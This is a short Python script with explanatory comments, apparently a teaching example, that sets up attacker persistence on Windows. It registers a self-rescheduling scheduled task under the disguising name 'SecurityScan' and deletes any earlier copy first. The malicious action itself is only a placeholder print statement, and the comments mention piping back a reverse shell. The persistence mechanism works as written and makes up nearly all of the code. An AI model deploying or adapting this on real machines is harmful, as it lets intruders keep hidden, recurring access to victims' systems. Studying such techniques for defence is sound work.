# Once an attacker has access to a user's system, or a method to get a script run after initial access,
# they can create scheduled tasks to achieve persistence on the machine. For instance, piping back a reverse shell to the attacker.
# This script established the persistence by taking advantage of Windows Scheduled Tasks.

import os, random
from datetime import datetime,timedelta

if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")
# These two lines test whether the task has already been created, and deletes if so.

print("I am doing malicious things")
# This would be the actual malicious action in a real attack scenario.

filedir = os.path.join(os.getcwd(),"sched.py")
# This line creates the file location with the malicious content. The specified example is just that; the real deal could be placed anywhere.

maxInterval = 1
interval = 1+(random.random()*(maxInterval-1))
# The two lines create an interval of once every minute.
dt = datetime.now() + timedelta(minutes=interval)
# This line finds the current time and adds the minute interval to it.
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
d = "%s/%s/%s" % (dt.month,str(dt.day).zfill(2),dt.year)
# These two lines are format the intervaled time to run the task specifically to work with the "schtasks" function of CMD.
os.system('schtasks /create /tn SecurityScan /tr "'+filedir+'" /sc once /st '+t+' /sd '+d)
# This line creates the command to pass to input() (just below) using the syntax formatted above. 
# "SecurityScan" is arbitrary, but must be consistent across the script.
input()
